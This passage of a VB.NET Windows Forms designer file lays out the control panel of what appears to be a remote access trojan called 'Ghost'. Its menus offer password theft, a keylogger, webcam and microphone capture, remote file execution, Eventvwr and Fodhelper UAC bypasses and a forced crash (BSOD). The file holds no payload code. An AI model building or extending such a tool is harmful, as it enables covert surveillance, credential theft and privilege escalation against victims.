        Me.IMG2.Images.SetKeyName(182, "PY.png")
        Me.IMG2.Images.SetKeyName(183, "QA.png")
        Me.IMG2.Images.SetKeyName(184, "RO.png")
        Me.IMG2.Images.SetKeyName(185, "RS.png")
        Me.IMG2.Images.SetKeyName(186, "RU.png")
        Me.IMG2.Images.SetKeyName(187, "RW.png")
        Me.IMG2.Images.SetKeyName(188, "SA.png")
        Me.IMG2.Images.SetKeyName(189, "SB.png")
        Me.IMG2.Images.SetKeyName(190, "SC.png")
        Me.IMG2.Images.SetKeyName(191, "SD.png")
        Me.IMG2.Images.SetKeyName(192, "SE.png")
        Me.IMG2.Images.SetKeyName(193, "SG.png")
        Me.IMG2.Images.SetKeyName(194, "SH.png")
        Me.IMG2.Images.SetKeyName(195, "SI.png")
        Me.IMG2.Images.SetKeyName(196, "SK.png")
        Me.IMG2.Images.SetKeyName(197, "SL.png")
        Me.IMG2.Images.SetKeyName(198, "SM.png")
        Me.IMG2.Images.SetKeyName(199, "SN.png")
        Me.IMG2.Images.SetKeyName(200, "SO.png")
        Me.IMG2.Images.SetKeyName(201, "SR.png")
        Me.IMG2.Images.SetKeyName(202, "SS.png")
        Me.IMG2.Images.SetKeyName(203, "ST.png")
        Me.IMG2.Images.SetKeyName(204, "SV.png")
        Me.IMG2.Images.SetKeyName(205, "SY.png")
        Me.IMG2.Images.SetKeyName(206, "SZ.png")
        Me.IMG2.Images.SetKeyName(207, "TC.png")
        Me.IMG2.Images.SetKeyName(208, "TD.png")
        Me.IMG2.Images.SetKeyName(209, "TF.png")
        Me.IMG2.Images.SetKeyName(210, "TG.png")
        Me.IMG2.Images.SetKeyName(211, "TH.png")
        Me.IMG2.Images.SetKeyName(212, "TJ.png")
        Me.IMG2.Images.SetKeyName(213, "TK.png")
        Me.IMG2.Images.SetKeyName(214, "TL.png")
        Me.IMG2.Images.SetKeyName(215, "TM.png")
        Me.IMG2.Images.SetKeyName(216, "TN.png")
        Me.IMG2.Images.SetKeyName(217, "TO.png")
        Me.IMG2.Images.SetKeyName(218, "TR.png")
        Me.IMG2.Images.SetKeyName(219, "TT.png")
        Me.IMG2.Images.SetKeyName(220, "TV.png")
        Me.IMG2.Images.SetKeyName(221, "TW.png")
        Me.IMG2.Images.SetKeyName(222, "TZ.png")
        Me.IMG2.Images.SetKeyName(223, "UA.png")
        Me.IMG2.Images.SetKeyName(224, "UG.png")
        Me.IMG2.Images.SetKeyName(225, "UN.png")
        Me.IMG2.Images.SetKeyName(226, "US.png")
        Me.IMG2.Images.SetKeyName(227, "UY.png")
        Me.IMG2.Images.SetKeyName(228, "UZ.png")
        Me.IMG2.Images.SetKeyName(229, "VA.png")
        Me.IMG2.Images.SetKeyName(230, "VC.png")
        Me.IMG2.Images.SetKeyName(231, "VE.png")
        Me.IMG2.Images.SetKeyName(232, "VG.png")
        Me.IMG2.Images.SetKeyName(233, "VI.png")
        Me.IMG2.Images.SetKeyName(234, "VN.png")
        Me.IMG2.Images.SetKeyName(235, "VU.png")
        Me.IMG2.Images.SetKeyName(236, "WF.png")
        Me.IMG2.Images.SetKeyName(237, "WS.png")
        Me.IMG2.Images.SetKeyName(238, "YE.png")
        Me.IMG2.Images.SetKeyName(239, "YT.png")
        Me.IMG2.Images.SetKeyName(240, "ZA.png")
        Me.IMG2.Images.SetKeyName(241, "ZM.png")
        Me.IMG2.Images.SetKeyName(242, "ZW.png")
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info
        Me.NotifyIcon1.ContextMenuStrip = Me.ContextMenuStrip2
        Me.NotifyIcon1.Icon = CType(resources.GetObject("NotifyIcon1.Icon"), System.Drawing.Icon)
        Me.NotifyIcon1.Text = "Ghost"
        Me.NotifyIcon1.Visible = True
        '
        'ContextMenuStrip2
        '
        Me.ContextMenuStrip2.BackColor = System.Drawing.SystemColors.ActiveCaptionText
        Me.ContextMenuStrip2.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ContextMenuStrip2.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.ContextMenuStrip2.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ShowToolStripMenuItem, Me.RestartToolStripMenuItem1, Me.ExitToolStripMenuItem})
        Me.ContextMenuStrip2.Name = "ContextMenuStrip2"
        Me.ContextMenuStrip2.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.ContextMenuStrip2.Size = New System.Drawing.Size(115, 70)
        '
        'ShowToolStripMenuItem
        '
        Me.ShowToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ShowToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem"
        Me.ShowToolStripMenuItem.Size = New System.Drawing.Size(114, 22)
        Me.ShowToolStripMenuItem.Text = "Show"
        '
        'RestartToolStripMenuItem1
        '
        Me.RestartToolStripMenuItem1.BackColor = System.Drawing.Color.Black
        Me.RestartToolStripMenuItem1.ForeColor = System.Drawing.Color.White
        Me.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1"
        Me.RestartToolStripMenuItem1.Size = New System.Drawing.Size(114, 22)
        Me.RestartToolStripMenuItem1.Text = "Restart"
        '
        'ExitToolStripMenuItem
        '
        Me.ExitToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ExitToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem"
        Me.ExitToolStripMenuItem.Size = New System.Drawing.Size(114, 22)
        Me.ExitToolStripMenuItem.Text = "Exit"
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        '
        'L1
        '
        Me.L1.AllowUserToAddRows = False
        Me.L1.AllowUserToDeleteRows = False
        Me.L1.BackgroundColor = System.Drawing.Color.Black
        Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.L1.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable
        Me.L1.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.[Single]
        DataGridViewCellStyle1.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft
        DataGridViewCellStyle1.BackColor = System.Drawing.Color.Black
        DataGridViewCellStyle1.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        DataGridViewCellStyle1.ForeColor = System.Drawing.Color.White
        DataGridViewCellStyle1.SelectionBackColor = System.Drawing.SystemColors.Highlight
        DataGridViewCellStyle1.SelectionForeColor = System.Drawing.SystemColors.HighlightText
        DataGridViewCellStyle1.WrapMode = System.Windows.Forms.DataGridViewTriState.[True]
        Me.L1.ColumnHeadersDefaultCellStyle = DataGridViewCellStyle1
        Me.L1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize
        Me.L1.ContextMenuStrip = Me.ContextMenuStrip1
        DataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft
        DataGridViewCellStyle2.BackColor = System.Drawing.Color.Black
        DataGridViewCellStyle2.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        DataGridViewCellStyle2.ForeColor = System.Drawing.Color.White
        DataGridViewCellStyle2.SelectionBackColor = System.Drawing.SystemColors.Highlight
        DataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black
        DataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.[False]
        Me.L1.DefaultCellStyle = DataGridViewCellStyle2
        Me.L1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.L1.EnableHeadersVisualStyles = False
        Me.L1.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.L1.GridColor = System.Drawing.Color.White
        Me.L1.Location = New System.Drawing.Point(0, 0)
        Me.L1.Name = "L1"
        Me.L1.ReadOnly = True
        Me.L1.RowHeadersVisible = False
        Me.L1.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect
        Me.L1.ShowCellErrors = False
        Me.L1.ShowEditingIcon = False
        Me.L1.ShowRowErrors = False
        Me.L1.Size = New System.Drawing.Size(967, 339)
        Me.L1.TabIndex = 2
        '
        'Pp1
        '
        Me.Pp1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Pp1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Pp1.Location = New System.Drawing.Point(0, 0)
        Me.Pp1.Name = "Pp1"
        Me.Pp1.Size = New System.Drawing.Size(967, 361)
        Me.Pp1.TabIndex = 3
        Me.Pp1.TabStop = False
        '
        'TriggerBSODToolStripMenuItem
        '
        Me.TriggerBSODToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.TriggerBSODToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TriggerBSODToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.TriggerBSODToolStripMenuItem.Image = CType(resources.GetObject("TriggerBSODToolStripMenuItem.Image"), System.Drawing.Image)
        Me.TriggerBSODToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.TriggerBSODToolStripMenuItem.Name = "TriggerBSODToolStripMenuItem"
        Me.TriggerBSODToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.TriggerBSODToolStripMenuItem.Text = "Trigger BSOD"
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(967, 361)
        Me.Controls.Add(Me.L1)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.Pp1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.ContextMenuStrip2.ResumeLayout(False)
        CType(Me.L1, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.Pp1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents ToolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabels5 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents conz As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents upl As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents dwn As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RunFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromLinkToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromDiskToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ScriptToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteDesktopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteCamToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MicrophoneToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GetPasswordsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents KeyloggerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OpenChatToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ServerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromDISKToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromLINKToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DisconnectToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RenameToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OpenFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents IMG2 As System.Windows.Forms.ImageList
    Friend WithEvents NotifyIcon1 As System.Windows.Forms.NotifyIcon
    Friend WithEvents L1 As L1
    Friend WithEvents Pp1 As Pp1
    Friend WithEvents ContextMenuStrip2 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ShowToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ExitToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents ToolStripStatusLabel2 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel6 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel7 As ToolStripStatusLabel
    Friend WithEvents PCToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem2 As ToolStripMenuItem
    Friend WithEvents ShutdownToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ATKStripStatusLabel10 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel4 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel11 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel9 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel10 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel14 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel18 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel17 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel16 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel13 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel15 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel3 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel5 As ToolStripStatusLabel
    Friend WithEvents ScheduledTasksToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ScheduleTasksToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RemoteScheduledTasksToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LogoffToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FunToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LockToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents UnlockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ScreamerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripStatusLabel12 As ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel8 As ToolStripStatusLabel
    Friend WithEvents UACToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents EventvwrToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FodhelperToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RunAsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem3 As ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem2 As ToolStripMenuItem
    Friend WithEvents TriggerBSODToolStripMenuItem As ToolStripMenuItem
End Class
